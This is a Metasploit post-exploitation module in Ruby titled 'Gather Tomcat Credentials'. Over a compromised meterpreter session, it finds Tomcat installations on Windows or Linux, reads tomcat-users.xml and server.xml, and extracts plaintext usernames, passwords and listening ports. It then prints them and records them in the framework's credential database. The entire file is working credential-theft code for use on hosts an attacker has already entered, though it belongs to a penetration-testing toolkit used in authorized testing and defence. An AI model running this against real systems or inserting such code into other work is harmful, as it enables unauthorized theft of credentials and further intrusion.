##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Services

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Gather Tomcat Credentials',
      'Description'   => %q{
        This module will attempt to collect credentials from Tomcat services running on the machine.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Koen Riepe <koen.riepe@fox-it.com>', # Module author
      ],
      'Platform'      => [ 'win', 'linux' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  $username = []
  $password = []
  $port = []
  $paths = []

  def report_creds(user, pass, port)
    return if (user.empty? or pass.empty?)
      # Assemble data about the credential objects we will be creating
      credential_data = {
        origin_type: :session,
        post_reference_name: self.fullname,
        private_data: pass,
        private_type: :password,
        session_id: session_db_id,
        username: user,
        workspace_id: myworkspace_id,
      }

      credential_core = create_credential(credential_data)

      if not port.is_a? Integer
        port = 8080
        print_status("Port not an Integer, defaulting to port #{port} for creds database")
      end

      login_data = {
            core: credential_core,
            status: Metasploit::Model::Login::Status::UNTRIED,
            address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
            port: port,
            service_name: 'Tomcat',
            protocol: 'tcp',
            workspace_id: myworkspace_id
        }
        create_credential_login(login_data)
  end

  def gatherwin
    print_status('Windows OS detected, enumerating services')
    tomcatHomeArray = []
    service_list.each do |service|
      if service[:name].downcase().include? "tomcat"
        print_good('Tomcat service found')
        tomcatHomeArray.push(service_info(service[:name])[:path].split("\\bin\\")[0])
      end
    end

    if tomcatHomeArray.size > 0
      tomcatHomeArray.each do |tomcat_home|
        if tomcat_home.include? '"'
          tomcat_home = tomcat_home.split('"')[1]
        end

        conf_path = "#{tomcat_home}\\conf\\tomcat-users.xml"

        if exist?(conf_path)
          print_status("#{conf_path} found!")
          xml = read_file(conf_path).split("\n")

          comment_block = false
          xml.each do |line|
            if line.include? "<user username=" and not comment_block
              $username.push(line.split('<user username="')[1].split('"')[0])
              $password.push(line.split('password="')[1].split('"')[0])
              $paths.push(conf_path)
            elsif line.include? ("<!--")
              comment_block = true
            elsif line.include? ("-->") and comment_block
              comment_block = false
            end
          end
        end

        port_path = "#{tomcat_home}\\conf\\server.xml"
        if exist?(port_path)
          xml = read_file(port_path).split("\n")
        end
        comment_block = false
        xml.each do |line|
          if line.include? "<Connector" and not comment_block
            i=0
            while i < $username.count
              $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
              i+=1
            end
          elsif line.include? ("<!--")
            comment_block = true
          elsif line.include? ("-->") and comment_block
            comment_block = false
          end
        end
      end
    else
      print_status('No Tomcat home can be determined')
    end
  end

  def gathernix
    print_status('Unix OS detected')
    user_files = cmd_exec('locate tomcat-users.xml').split("\n")
    if user_files.size > 0
      user_files.each do |path|
        if exist?(path)
          print_status("#{path} found")
          begin
            xml = read_file(path).split("\n")
            comment_block = false
            xml.each do |line|
              if line.include? "<user username=" and not comment_block
                $username.push(line.split('<user username="')[1].split('"')[0])
                $password.push(line.split('password="')[1].split('"')[0])
                $paths.push(path)
              elsif line.include? ("<!--")
                comment_block = true
              elsif line.include? ("-->") and comment_block
                comment_block = false
              end
            end
          rescue
            print_error("Cannot open #{path} you probably don't have permission to open the file or parsing failed")
          end
        end
      end
    else
      print_status('No tomcat installation has been detected')
    end

    port_path = cmd_exec('locate server.xml').split("\n")
    if port_path.size > 0
      port_path.each do |path|
        if exist?(path) and path.include? "tomcat"
          print_status("Attempting to extract Tomcat listening ports from #{path}")
          begin
            xml = read_file(path).split("\n")
            comment_block = false
            xml.each do |line|
              if line.include? "<Connector" and not comment_block
                i=0
                while i < $username.count
                  $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
                  i+=1
                end
              elsif line.include? ("<!--")
                comment_block = true
              elsif line.include? ("-->") and comment_block
                comment_block = false
              end
            end
          rescue
            print_status("Cannot open #{path} you probably don't have permission to open the file or parsing failed")
          end
        end
      end
    else
      print_status('Failed to detect tomcat service port')
    end
  end

  def run
    if sysinfo
      if sysinfo['OS'].include? "Windows"
        gatherwin
      else
        gathernix
      end
    else
      print_error('Incompatible session type, sysinfo is not available.')
    end

    if $username.size == 0
      print_status("No user credentials have been found")
    end

    i=0
    while i < $username.count
      print_good("Username and password found in #{$paths[i]} - #{$username[i]}:#{$password[i]}")
      report_creds($username[i],$password[i],$port[i])
      i+=1
    end

    $username = []
    $password = []
    $port = []
    $paths = []
  end
end
